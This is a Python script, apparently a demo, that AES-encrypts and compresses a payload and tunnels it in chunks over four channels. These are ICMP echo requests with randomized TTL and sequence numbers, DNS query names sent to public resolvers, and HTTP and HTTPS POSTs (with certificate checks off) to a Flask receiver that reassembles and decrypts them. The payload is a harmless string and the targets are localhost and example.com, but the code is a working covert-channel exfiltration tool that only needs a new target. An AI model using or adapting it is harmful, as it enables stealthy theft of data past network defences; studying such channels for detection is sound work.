import os
import random
import string
import time
import hashlib
import threading
import zlib
import base64
import uuid
import requests
from flask import Flask, request, jsonify
from scapy.all import IP, ICMP, UDP, DNS, DNSQR, send, sniff, Raw
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad

# Configuration
SECRET_KEY = "mysecretkey12345"  # Key for encryption and decryption
received_chunks_icmp = {}  # Dictionary to hold received ICMP chunks
received_chunks_dns = {}   # Dictionary to hold received DNS chunks
received_chunks_http = {}  # Dictionary to hold received HTTP chunks
stop_sniffer = threading.Event()  # Event to signal the sniffer to stop
dict_lock = threading.Lock()  # Lock for thread-safe access to received_chunks
DNS_DOMAIN = "example.com"  # Example domain for DNS queries
dns_servers = ["8.8.8.8", "8.8.4.4"]  # Public DNS servers for testing
HTTP_SERVER_IP = "127.0.0.1"  # Localhost for testing HTTP/HTTPS traffic
HTTP_SERVER_PORT = 5000  # Port for the HTTP server

# Encryption and Compression function
def encrypt_and_compress_payload(payload):
    compressed_payload = zlib.compress(payload.encode())
    key = hashlib.sha256(SECRET_KEY.encode()).digest()
    cipher = AES.new(key, AES.MODE_CBC)
    ct_bytes = cipher.encrypt(pad(compressed_payload, AES.block_size))
    return cipher.iv + ct_bytes

# Decryption and Decompression function
def decrypt_and_decompress_payload(encrypted_payload):
    try:
        key = hashlib.sha256(SECRET_KEY.encode()).digest()
        iv = encrypted_payload[:16]
        ct = encrypted_payload[16:]
        cipher = AES.new(key, AES.MODE_CBC, iv)
        compressed_payload = unpad(cipher.decrypt(ct), AES.block_size)
        decompressed_payload = zlib.decompress(compressed_payload)
        return decompressed_payload.decode()
    except Exception as e:
        raise Exception(f"Decryption failed: {e}")

# Flask app for HTTP/HTTPS server
app = Flask(__name__)

@app.route('/receive_payload', methods=['POST'])
def receive_payload():
    data = request.json
    if not data or 'chunk_index' not in data or 'chunk' not in data:
        return jsonify({"error": "Invalid payload"}), 400

    try:
        chunk_index = data['chunk_index']
        chunk = base64.b64decode(data['chunk'])

        with dict_lock:
            if chunk_index not in received_chunks_http:
                received_chunks_http[chunk_index] = chunk
                print(f"[Receiver - HTTP/HTTPS] Received chunk index {chunk_index}: {chunk}")
            else:
                print(f"[Receiver - HTTP/HTTPS] Duplicate chunk index {chunk_index} ignored.")
        return jsonify({"status": "success"}), 200
    except Exception as e:
        return jsonify({"error": str(e)}), 500

def start_http_server():
    app.run(host=HTTP_SERVER_IP, port=HTTP_SERVER_PORT, debug=False, use_reloader=False)

def start_https_server():
    context = ('cert.pem', 'key.pem')  # Paths to your SSL certificate and key
    app.run(host=HTTP_SERVER_IP, port=HTTP_SERVER_PORT + 1, ssl_context=context, debug=False, use_reloader=False)

# ICMP Payload Sender
def send_icmp_payload(payload, target_ip):
    chunk_size = 32
    payload_chunks = [payload[i:i + chunk_size] for i in range(0, len(payload), chunk_size)]

    for i, chunk in enumerate(payload_chunks):
        sequence_number = random.randint(0, 65535)
        ttl_value = random.randint(30, 128)
        packet = IP(dst=target_ip, ttl=ttl_value) / ICMP(type='echo-request', seq=sequence_number) / Raw(load=chunk)
        send(packet, verbose=False)
        print(f"[Sender - ICMP] Sent chunk index {i}")

# DNS Payload Sender
def send_dns_payload(payload):
    chunk_size = 32
    payload_chunks = [payload[i:i + chunk_size] for i in range(0, len(payload), chunk_size)]

    for i, chunk in enumerate(payload_chunks):
        dns_server = random.choice(dns_servers)
        query_name = base64.urlsafe_b64encode(chunk).decode().rstrip('=') + f".{DNS_DOMAIN}"
        packet = IP(dst=dns_server) / UDP(dport=53) / DNS(rd=1, qd=DNSQR(qname=query_name))
        send(packet, verbose=False)
        print(f"[Sender - DNS] Sent chunk index {i}")

# HTTP Payload Sender
def send_http_payload(payload, target_ip):
    chunk_size = 32
    payload_chunks = [payload[i:i + chunk_size] for i in range(0, len(payload), chunk_size)]

    for i, chunk in enumerate(payload_chunks):
        chunk_b64 = base64.b64encode(chunk).decode()
        data = {
            "chunk_index": i,
            "chunk": chunk_b64
        }

        try:
            response = requests.post(f"http://{target_ip}:{HTTP_SERVER_PORT}/receive_payload", json=data)
            if response.status_code == 200:
                print(f"[Sender - HTTP] Successfully sent chunk index {i}")
            else:
                print(f"[Sender - HTTP] Failed to send chunk index {i}: {response.text}")
        except Exception as e:
            print(f"[Sender - HTTP] Error sending chunk index {i}: {e}")

# HTTPS Payload Sender
def send_https_payload(payload, target_ip):
    chunk_size = 32
    payload_chunks = [payload[i:i + chunk_size] for i in range(0, len(payload), chunk_size)]

    for i, chunk in enumerate(payload_chunks):
        chunk_b64 = base64.b64encode(chunk).decode()
        data = {
            "chunk_index": i,
            "chunk": chunk_b64
        }

        try:
            response = requests.post(f"https://{target_ip}:{HTTP_SERVER_PORT + 1}/receive_payload", json=data, verify=False)
            if response.status_code == 200:
                print(f"[Sender - HTTPS] Successfully sent chunk index {i}")
            else:
                print(f"[Sender - HTTPS] Failed to send chunk index {i}: {response.text}")
        except Exception as e:
            print(f"[Sender - HTTPS] Error sending chunk index {i}: {e}")

# Main Script
if __name__ == "__main__":
    target_ip = HTTP_SERVER_IP
    text_payload = "This is my hardcoded payload that I am tunneling over."

    # Encrypt and compress the payload
    encrypted_payload = encrypt_and_compress_payload(text_payload)
    print(f"[Main] Original Encrypted Payload Length: {len(encrypted_payload)}")

    # Start HTTP and HTTPS server threads
    print("[Main] Starting HTTP and HTTPS servers...")
    http_server_thread = threading.Thread(target=start_http_server, daemon=True)
    http_server_thread.start()

    https_server_thread = threading.Thread(target=start_https_server, daemon=True)
    https_server_thread.start()

    # Give the servers time to start
    time.sleep(2)

    # Send payload via all protocols
    print("[Main] Sending payload via ICMP...")
    send_icmp_payload(encrypted_payload, target_ip)

    print("[Main] Sending payload via DNS...")
    send_dns_payload(encrypted_payload)

    print("[Main] Sending payload via HTTP...")
    send_http_payload(encrypted_payload, target_ip)

    print("[Main] Sending payload via HTTPS...")
    send_https_payload(encrypted_payload, target_ip)

    # Wait for threads to process
    time.sleep(10)

    # Reassemble and decrypt received HTTPS chunks
    with dict_lock:
        if received_chunks_http:
            try:
                sorted_chunks = [received_chunks_http[key] for key in sorted(received_chunks_http.keys())]
                reassembled_payload = b''.join(sorted_chunks)
                decrypted_payload = decrypt_and_decompress_payload(reassembled_payload)
                print(f"[Receiver - HTTPS] Final Decrypted Payload: {decrypted_payload}")
            except Exception as e:
                print(f"[Receiver - HTTPS] Error: {e}")